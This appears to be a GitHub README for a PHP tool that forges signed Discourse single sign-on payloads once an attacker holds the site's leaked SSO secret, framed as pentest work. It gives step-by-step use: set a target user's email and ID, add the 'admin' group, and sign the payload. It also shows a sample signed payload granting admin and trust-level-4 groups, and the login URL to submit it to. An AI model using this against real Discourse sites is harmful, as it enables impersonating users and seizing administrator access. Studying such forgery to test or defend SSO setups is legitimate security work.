# Discourse SSO Payload Generator

## Description
Recently while conducting a pentest on a web application that utilizes Discourse, I stumbled across an error page that dumped a stack trace, server-side code, and environment variables including the `DISCOURSE_SSO_SECRET`. After a little reverse engineering of the code, this PHP script was crafted to generate and sign SSO payloads for Discourse, allowing you to test SSO functionality, authentication flows, and potential privilege escalation scenarios. It uses the `DISCOURSE_SSO_SECRET` to create valid and signed SSO payloads.

---

## Features
- Generate SSO payloads for existing users.
- Customize user attributes such as `email`, `external_id`, `name`, and `add_groups`.
- Sign payloads with the `DISCOURSE_SSO_SECRET`.
- Use crafted payloads to test authentication and privilege escalation.

---

## Usage

### Prerequisites
- PHP installed on your system.
- Access to the `DISCOURSE_SSO_SECRET` from the Discourse configuration.

### Steps
1. **Clone the Repository**:
   ```bash
   git clone https://github.com/quantumthe0ry/Discourse_SSO_Generator.git
   cd your-repo
2. **Edit the script**:
   - Open the script (`discourse_sso_gen.php`) and replace `YOUR_DISCOURSE_SSO_SECRET` with the actual secret key.
   - Modify the `$userData` array to include the desired user details:
   ```bash
   $userData = [
    'nonce' => 'valid_nonce_value', // Replace with a valid nonce
    'email' => 'target_user@example.com',
    'external_id' => '1234',
    'name' => 'Target User',
    'add_groups' => 'admin' // Optional: Add or remove groups
];
3. **Run the script**:
    ```bash
    php discourse_sso_gen.php
4. **Output: The script will generate a signed SSO payload and display it in the format**:
    ```bash
    SSO Payload:
sso=bm9uY2U9MzMzNjY2OTk5JmVtYWlsPWVtYWlsJTQwZW1haWwuY29tJmV4dGVybmFsX2lkPTkxOTMmbmFtZT1Kb2huK0RvZSZhZGRfZ3JvdXBzPXRydXN0X2xldmVsXzQlMkNhZG1pbg==
sig=aadd147e5ef9a5ac6c52e0cbd786d61e1a288fc01728364ff97e53cdf3652738
5. **Construct the SSO URL**:
    ```bash
    https://your-discourse-instance.com/session/sso_login?sso=<base64_encoded_payload>&sig=<signature>
6. **Test the Payload**:
    - Use the constructed URL to send the crafted payload to the Discourse SSO endpoint.


